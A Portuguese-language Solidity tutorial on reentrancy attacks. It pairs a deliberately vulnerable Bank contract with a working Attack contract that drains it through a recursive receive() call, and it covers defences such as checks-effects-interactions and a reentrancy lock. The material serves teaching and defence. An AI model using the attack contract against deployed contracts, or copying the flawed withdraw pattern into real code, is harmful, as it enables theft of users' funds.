# WTF Solidity: S01. Ataque de Reentrada

Eu recentemente tenho reestudado Solidity para consolidar alguns detalhes e também escrever um guia "WTF Solidity Simplificado" para iniciantes (programadores experientes podem procurar outros tutoriais), com atualização semanal de 1 a 3 episódios.

Twitter: [@0xAA_Science](https://twitter.com/0xAA_Science)

Comunidade: [Discord](https://discord.gg/5akcruXrsk) | [Grupo do WhatsApp](https://docs.google.com/forms/d/e/1FAIpQLSe4KGT8Sh6sJ7hedQRuIYirOoZK_85miz3dw7vA1-YjodgJ-A/viewform?usp=sf_link) | [Site oficial wtf.academy](https://wtf.academy)

Todo o código e tutoriais estão disponíveis no GitHub: [github.com/AmazingAng/WTFSolidity](https://github.com/AmazingAng/WTF-Solidity)

---

Nesta lição, iremos abordar um dos ataques mais comuns em contratos inteligentes, o ataque de reentrada, que causou o famoso fork no Ethereum, resultando em ETH e ETC (Ethereum Classic), e como evitar esse tipo de ataque.

## Ataque de Reentrada

O ataque de reentrada é um dos ataques mais comuns em contratos inteligentes, no qual um invasor aproveita uma vulnerabilidade no contrato (por exemplo, na função fallback) para chamar repetidamente o contrato, transferindo ativos ou gerando uma grande quantidade de tokens.

Alguns eventos famosos de ataque de reentrada:

- Em 2016, o contrato The DAO foi alvo de um ataque de reentrada, resultando no roubo de 3.600.000 ETH e no fork do Ethereum, dividindo-se em ETH e ETC.
- Em 2019, a plataforma de ativos sintéticos Synthetix sofreu um ataque de reentrada, resultando no roubo de 3.700.000 sETH.
- Em 2020, a plataforma de empréstimos Lendf.me foi vítima de um ataque de reentrada, resultando no roubo de $25.000.000.
- Em 2021, a plataforma de empréstimos CREAM FINANCE sofreu um ataque de reentrada, resultando no roubo de $18.800.000.
- Em 2022, o projeto de algoritmo stablecoin Fei foi alvo de um ataque de reentrada, resultando no roubo de $80.000.000.

Mesmo após 6 anos desde o ataque ao The DAO, ainda há projetos que perdem milhões de dólares devido a vulnerabilidades de reentrada, por isso é fundamental entender essa vulnerabilidade.

## História do Hack 0xAA

Para facilitar o entendimento, vou contar a história do "hacker 0xAA rouba um banco".

Os caixas eletrônicos do banco Ethereum são controlados por robôs (Robots) por meio de contratos inteligentes. Quando um usuário comum (Usuário) vai ao banco para sacar dinheiro, o processo de serviço é o seguinte:

1. Verificar o saldo do usuário em ETH e, se for superior a 0, passar para o próximo passo.
2. Transferir o saldo em ETH do usuário para ele e perguntar se ele recebeu o dinheiro.
3. Atualizar o saldo do usuário para 0.

Um dia, o hacker 0xAA entrou no banco. Aqui está a conversa entre ele e o caixa automatizado:

- 0xAA: Quero sacar 1 ETH.
- Robot: Verificando seu saldo: 1 ETH. Transferindo 1 ETH para sua conta. Você recebeu o dinheiro?
- 0xAA: Espere, quero sacar mais 1 ETH.
- Robot: Verificando seu saldo: 1 ETH. Transferindo 1 ETH para sua conta. Você recebeu o dinheiro?
- 0xAA: Espere, quero sacar mais 1 ETH.
- Robot: Verificando seu saldo: 1 ETH. Transferindo 1 ETH para sua conta. Você recebeu o dinheiro?
- 0xAA: E assim por diante.

No final, o 0xAA, através de uma vulnerabilidade de reentrada, esvaziou os ativos do banco e o banco ficou sem recursos.

## Exemplo de Contrato Vulnerável

### Contrato do Banco

O contrato do banco é muito simples, contendo uma variável de estado `balanceOf` para armazenar o saldo de todos os usuários em ETH, e possui as seguintes funções:

- `deposit()`: função de depósito que permite aos usuários depositarem ETH no contrato do banco e atualiza o saldo do usuário.
- `withdraw()`: função de saque que transfere o saldo do usuário de volta para ele. Esta função é onde a vulnerabilidade de reentrada está presente! 
- `getBalance()`: função para obter o saldo de ETH no contrato do banco.

```solidity
contract Bank {
    mapping(address => uint256) public balanceOf;    // Mapeamento de balanços

    // Depositar ETH e atualizar o balanço
    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // Retirar todo o ETH do msg.sender
    function withdraw() external {
        uint256 balance = balanceOf[msg.sender]; // Obter o balanço
        require(balance > 0, "Saldo insuficiente");
        // Transferir o ETH !!! Pode ativar o fallback/receive de contratos maliciosos, com risco de reentrada!
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Falha ao enviar Ether");
        // Atualizar o balanço
        balanceOf[msg.sender] = 0;
    }

    // Obter o saldo de ETH no contrato do banco
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

### Contrato de Ataque

A principal vulnerabilidade do ataque de reentrada acontece quando o contrato transfere ETH para outro contrato. O endereço de destino das transferências de ETH pode ser um contrato que irá acionar a função fallback() ou receive() desse contrato. Se o hacker implementar a função fallback ou receive para chamar repetidamente a função withdraw() do contrato Bank, ocorrerá a reentrada. No exemplo abaixo, o fallback do contrato de ataque chama repetidamente a função withdraw() do contrato Bank.

```solidity
    receive() external payable {
        bank.withdraw();
    }
```

No contrato de ataque abaixo, a lógica é simples: por meio da função receive(), será feita uma chamada repetida à função withdraw() do contrato Bank. O contrato contém uma variável de estado `bank` para armazenar o endereço do contrato Bank e possui as seguintes funções:

- Construtor: inicializa o endereço do contrato Bank.
- `receive()`: função fallback que é acionada ao receber ETH e chama repetidamente a função `withdraw()` do contrato Bank, provocando a reentrada.
- `attack()`: função de ataque que primeiro deposita ETH no contrato Bank usando a função `deposit()`, em seguida chama a função `withdraw()` do contrato Bank iniciando o ataque de reentrada.
- `getBalance()`: função para obter o saldo de ETH no contrato de ataque.

```solidity
contract Attack {
    Bank public bank; // Endereço do contrato Bank

    // Inicializar o endereço do contrato Bank
    constructor(Bank _bank) {
        bank = _bank;
    }

    // Função fallback para realizar o ataque de reentrada
    receive() external payable {
        if (bank.getBalance() >= 1 ether) {
            bank.withdraw();
        }
    }

    // Função de ataque
    function attack() external payable {
        require(msg.value == 1 ether, "É necessário 1 Ether para o ataque");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    // Obter o balanço do contrato de ataque
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

## Demonstração no Remix

1. Implante o contrato Banco (Bank) e chame a função `deposit()`, transferindo 20 ETH.
2. Mude para a wallet do invasor, implante o contrato de Ataque (Attack).
3. Chame a função `attack()` do contrato de ataque para iniciar o ataque, lembrando de enviar 1 ETH.
4. Chame a função `getBalance()` do contrato Bank para ver o saldo zerado.
5. Chame a função `getBalance()` do contrato de ataque para ver o saldo alterado para 21 ETH, indicando o sucesso do ataque de reentrada.

## Medidas Preventivas

Atualmente, existem duas maneiras principais de prevenir possíveis ataques de reentrada: o padrão checks-effects-interactions e o uso de trava de reentrada.

### Padrão Checks-Effects-Interactions

O padrão checks-effects-interactions enfatiza que, ao escrever funções em contratos, é importante verificar primeiro se as variáveis de estado estão em conformidade, depois atualizar essas variáveis (como saldo) e, por último, interagir com outros contratos. Modificando a função `withdraw()` no contrato Bank para atualizar o saldo antes de transferir o ETH, podemos corrigir a vulnerabilidade:

```solidity
function withdraw() external {
    uint256 balance = balanceOf[msg.sender];
    require(balance > 0, "Saldo insuficiente");
    // Padrão checks-effects-interactions: atualizar o saldo antes de enviar o ETH
    // Durante um ataque de reentrada, balanceOf[msg.sender] já foi atualizado para 0 e não passará na verificação acima.
    balanceOf[msg.sender] = 0;
    (bool success, ) = msg.sender.call{value: balance}("");
    require(success, "Falha ao enviar Ether");
}
```

### Trava de Reentrada

A trava de reentrada é um modificador que previne a execução de funções de reentrada. Ela contém uma variável de estado `_status` que é inicializada como `0`. Quando uma função é marcada com o modificador `nonReentrant`, ela verifica se `_status` é `0` na primeira chamada, em seguida, muda o valor de `_status` para `1`, e somente depois de finalizar a chamada é que `_status` é revertido para `0`. Com isso, se o contrato de ataque tentar reentrar antes de a chamada anterior ter sido concluída, é gerado um erro.

```solidity
uint256 private _status; // Trava de reentrada

// Modificador para prevenir reentrância
modifier nonReentrant() {
    // Na primeira chamada do nonReentrant, _status será 0
    require(_status == 0, "ReentrancyGuard: chamada de reentrada");
    // Qualquer chamada subsequente a nonReentrant vai falhar
    _status = 1;
    _;
    // Após a chamada, restaurar _status para 0
    _status = 0;
}
```

A função `withdraw()` marcada com o modificador `nonReentrant` previne ataques de reentrada.

```solidity
// Proteger funções vulneráveis com a trava de reentrada
function withdraw() external nonReentrant {
    uint256 balance = balanceOf[msg.sender];
    require(balance > 0, "Saldo insuficiente");

    (bool success, ) = msg.sender.call{value: balance}("");
    require(success, "Falha ao enviar Ether");

    balanceOf[msg.sender] = 0;
}
```

Também é recomendado seguir o padrão de Pagamentos por Solicitação do OpenZeppelin para evitar possíveis ataques de reentrada. Esse padrão divide a transferência de ativos em duas etapas: "iniciar a transferência" e "concluir a transferência". Quando uma transferência precisa ser feita, o valor a ser transferido é armazenado em um contrato terceirizado (escrow) por meio da função `_asyncTransfer(address dest, uint256 amount)`, evitando assim perdas por reentrada. E quando o destinatário deseja receber os ativos ele deve chamar ativamente a função `withdrawPayments(address payable payee)` para solicitar os ativos.

## Conclusão

Nesta lição, exploramos um dos ataques mais comuns no Ethereum - o ataque de reentrada. Contei a história do "hack 0xAA roubando um banco" para facilitar a compreensão e também introduzi duas maneiras de prevenir o ataque: o padrão checks-effects-interactions e a trava de reentrada. No exemplo, o hacker aproveitou a função fallback para atacar o contrato. Recomendo para iniciantes proteger todas as funções `external` que podem alterar o estado do contrato com a trava de reentrada, mesmo que isso possa consumir mais `gas`, é uma prevenção eficaz contra perdas maiores.

